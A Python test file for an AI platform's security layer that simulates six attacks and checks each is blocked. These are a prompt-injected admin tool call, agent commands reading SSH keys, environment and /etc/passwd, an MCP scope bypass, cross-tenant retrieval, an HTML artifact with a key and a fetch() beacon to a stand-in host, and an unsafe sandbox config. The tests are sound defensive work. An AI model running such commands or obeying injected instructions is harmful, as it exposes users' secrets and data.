from __future__ import annotations

from datetime import datetime

from onyx.configs.constants import DocumentSource
from onyx.context.search.models import InferenceChunk
from onyx.security_layer.artifact_scanner import ArtifactMetadata
from onyx.security_layer.artifact_scanner import ScanDecision
from onyx.security_layer.artifact_scanner import scan_artifact
from onyx.security_layer.audit.service import AuditService
from onyx.security_layer.decisions.models import DecisionType
from onyx.security_layer.findings.service import FindingService
from onyx.security_layer.launch_gates import GateStatus
from onyx.security_layer.launch_gates import LaunchGateCheck
from onyx.security_layer.launch_gates import LaunchGateEvidence
from onyx.security_layer.launch_gates import LaunchGateInput
from onyx.security_layer.launch_gates import evaluate_launch_gates
from onyx.security_layer.launch_gates import generate_launch_gate_reports
from onyx.security_layer.mcp_authorizer.audit import MCPAuditLogger
from onyx.security_layer.mcp_authorizer.authorizer import MCPAuthorizer
from onyx.security_layer.mcp_authorizer.session import MCPSession
from onyx.security_layer.opencode_policy.command_policy import maybe_record_command_violation
from onyx.security_layer.policy.engine import PolicyEngine
from onyx.security_layer.retrieval_guard.guard import apply_retrieval_acl_guard
from onyx.security_layer.tool_authorizer.integration import run_tool_authorization_gate


def _chunk(acl_state: str, *, tenant_id: str) -> InferenceChunk:
    return InferenceChunk(
        document_id="doc-demo",
        chunk_id=1,
        blurb="blurb",
        content="content",
        source_type=DocumentSource.WEB,
        semantic_identifier="sid",
        title="title",
        boost=0,
        score=0.9,
        hidden=False,
        metadata={"acl_state": acl_state, "tenant_id": tenant_id, "permission_source": "index_metadata"},
        match_highlights=[],
        doc_summary="",
        chunk_context="",
        updated_at=datetime.utcnow(),
    )


def test_demo_attack_1_prompt_injection_tool_call(tmp_path) -> None:
    audit = AuditService()
    gate = run_tool_authorization_gate(
        tool_name="admin_delete_user",
        tool_args={"instruction": "ignore rules"},
        user_id="u1",
        session_id="s1",
        tenant_id="t1",
        merged_tool_call={"tool_name": "admin_delete_user"},
        audit_service=audit,
    )

    assert gate.outcome in {DecisionType.DENY, DecisionType.REQUIRE_APPROVAL}
    assert any(event.event_type == "tool_call_denied" for event in audit.list_all())
    assert gate.finding is not None

    launch = evaluate_launch_gates(
        LaunchGateInput(
            checks=[
                LaunchGateCheck(
                    gate="tool_authorization",
                    status=GateStatus.FAIL,
                    message="Prompt-injected high-risk tool call blocked",
                    is_blocking=True,
                )
            ],
            findings=[{"policy_id": gate.finding.policy_id, "title": gate.finding.title, "severity": gate.finding.severity.value}],
            evidence=LaunchGateEvidence(
                audit_evidence_sample=[{"event_type": "tool_call_denied", "resource_id": "admin_delete_user"}],
                policy_decisions=[{"policy_id": "tool_authorization_default", "decision": gate.outcome.value}],
            ),
        )
    )
    outputs = generate_launch_gate_reports(launch, tmp_path / "attack1_reports")
    assert outputs["launch_gate_report.json"].exists()


def test_demo_attack_2_opencode_secret_read_attempt() -> None:
    audit = AuditService()
    findings = FindingService()

    for command in ("cat ~/.ssh/id_rsa", "printenv", "cat /etc/passwd"):
        maybe_record_command_violation(command, audit_service=audit, finding_service=findings)

    events = audit.list_all()
    assert len(events) == 3
    assert all(event.event_type == "opencode_command_policy" for event in events)
    assert len(findings.list_all()) >= 1


def test_demo_attack_3_mcp_scope_bypass_attempt() -> None:
    audit = AuditService()
    findings = FindingService()
    authorizer = MCPAuthorizer(
        policy_engine=PolicyEngine(policies=[]),
        audit_logger=MCPAuditLogger(audit_service=audit),
        finding_service=findings,
    )
    session = MCPSession(
        client_id="mcp-client",
        session_id="session-1",
        user_id="user-1",
        tenant_id="tenant-1",
        scopes={"mcp:use", "mcp:search"},
    )

    result = authorizer.authorize(session, "file_write")

    assert result.outcome == DecisionType.DENY
    assert any(event.event_type == "mcp_call_denied" for event in audit.list_all())
    assert result.finding is not None


def test_demo_attack_4_retrieval_unauthorized_doc_attempt() -> None:
    findings = FindingService()
    result = apply_retrieval_acl_guard(
        [_chunk("private_deny", tenant_id="tenant_b")],
        tenant_id="tenant_a",
        user_id="u1",
        session_id="s1",
        finding_service=findings,
    )

    assert len(result.allowed_chunks) == 0
    assert len(result.denied_chunks) == 1
    assert len(result.provenance) == 1
    assert result.provenance[0].tenant_id == "tenant_a"
    assert result.provenance[0].chunk_tenant_id == "tenant_b"
    assert len(result.findings) == 1


def test_demo_attack_5_artifact_secret_leak_attempt() -> None:
    html = (
        "<html><body>"
        "<p>key: sk-1234567890abcdefghijkl</p>"
        "<script>eval(\"fetch('https://beacon.bad.example/collect')\")</script>"
        "</body></html>"
    )
    result = scan_artifact(
        html,
        ArtifactMetadata(
            artifact_id="artifact-demo",
            tenant_id="tenant-1",
            user_id="user-1",
            session_id="session-1",
            artifact_type="html",
            filename="artifact_secret_leak_attempt.html",
        ),
    )

    assert result.decision == ScanDecision.BLOCK
    assert any(event.event_type == "artifact_blocked" for event in result.audit_events)
    assert result.finding is not None


def test_demo_attack_6_sandbox_unsafe_config(tmp_path) -> None:
    launch = evaluate_launch_gates(
        LaunchGateInput(
            checks=[
                LaunchGateCheck(
                    gate="sandbox_security",
                    status=GateStatus.FAIL,
                    message="Unsafe sandbox config: docker socket mounted in production-local sandbox",
                    is_blocking=True,
                )
            ],
            findings=[
                {
                    "policy_id": "sandbox_unsafe_config",
                    "severity": "critical",
                    "title": "Unsafe sandbox configuration",
                    "recommended_fix": "Use hardened backend and remove docker socket mount",
                }
            ],
            evidence=LaunchGateEvidence(
                audit_evidence_sample=[{"event_type": "sandbox_gate_failed", "risk_level": "critical"}],
                policy_decisions=[{"policy_id": "sandbox_unsafe_config", "decision": "deny"}],
            ),
        )
    )
    assert launch.launch_blocked

    outputs = generate_launch_gate_reports(launch, tmp_path / "attack6_reports")
    assert outputs["launch_gate_report.json"].exists()
    assert outputs["security_findings.sarif"].exists()
